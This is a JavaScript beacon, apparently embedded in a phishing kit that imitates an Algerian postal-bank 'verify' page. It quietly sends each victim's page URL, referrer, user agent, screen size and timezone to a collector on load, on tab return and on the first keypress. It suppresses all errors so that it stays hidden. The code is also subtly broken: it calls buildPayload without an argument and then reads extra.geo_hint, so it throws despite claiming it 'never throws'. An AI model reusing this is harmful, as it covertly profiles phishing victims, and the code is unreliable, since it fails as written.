/**
 * FEDJAJ Kit telemetry beacon — fires from the victim's browser.
 *
 * Payload sent to the collector (POST /beacon or appended to /submit):
 * {
 *   "kit": "baridi-verify",
 *   "kit_hash": "sha256 of this beacon.js (set at deploy)",
 *   "campaign_id": "...",
 *   "url": "victim's page URL",
 *   "referrer": document.referrer,
 *   "ua": navigator.userAgent,
 *   "screen": "w-h",
 *   "tz": Intl.DateTimeFormat().resolvedOptions().timeZone,
 *   "ts": epoch_ms,
 *   "geo_hint": "DZ"  // attacker-assigned; we record it, do NOT resolve externally
 * }
 *
 * Fires on load, on visibility change, and on form submit. Never throws;
 * never logs errors to the console (phishers will inspect console).
 * Uses keepalive so the request survives page unload.
 */
(function() {
  var KIT = window.KIT || {};
  var KIT_ID = KIT.kit_id || 'baridi-verify';
  var KIT_HASH = KIT.kit_hash || 'local-dev';
  var COLLECTOR = window.KIT_COLLECTOR || '/beacon';
  var CAMPAIGN = (function() {
    var s = new URLSearchParams(window.location.search);
    return s.get('camp') || s.get('campaign') || 'default';
  })();

  function buildPayload(extra) {
    return JSON.stringify({
      kit: KIT_ID,
      kit_hash: KIT_HASH,
      campaign_id: CAMPAIGN,
      url: document.URL,
      referrer: document.referrer,
      ua: (navigator.userAgent || '').slice(0, 300),
      screen: (screen.width + '-' + screen.height),
      tz: (function() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return 'unknown'; } })(),
      ts: Date.now(),
      geo_hint: extra.geo_hint || 'DZ',
      event: extra.event || 'page_load'
    });
  }

  function send(payload) {
    try {
      var url = COLLECTOR;
      if (COLLECTOR === '/submit') {
        // append beacon as query param to avoid body-rewrite issues
        url = COLLECTOR + (COLLECTOR.indexOf('?') >= 0 ? '&' : '?') + '__fdj_beacon=' + encodeURIComponent(payload);
      }
      fetch(url, { method: 'POST', body: payload, keepalive: true });
    } catch (e) {
      // no-op: never expose failure
    }
  }

  // Fire immediately (deferred slightly to avoid blocking render)
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() { send(buildPayload()); });
  } else {
    send(buildPayload());
  }

  // Fire on visibility change (user came back to tab = active campaign)
  document.addEventListener('visibilitychange', function() {
    if (!document.hidden) { send(buildPayload({ event: 'tab_visible' })); }
  });

  // Expose the beacon so the kit's own JS can trigger custom events (submit, etc.)
  window.fdjBeacon = function(extra) { send(buildPayload(extra)); };

  // Safety net: if the page has a form, fire a beacon when the first input is filled
  document.addEventListener('keydown', function() {
    window.fdjBeacon({ event: 'form_interaction' });
    document.removeEventListener('keydown', arguments.callee, true);
  }, true);
})();
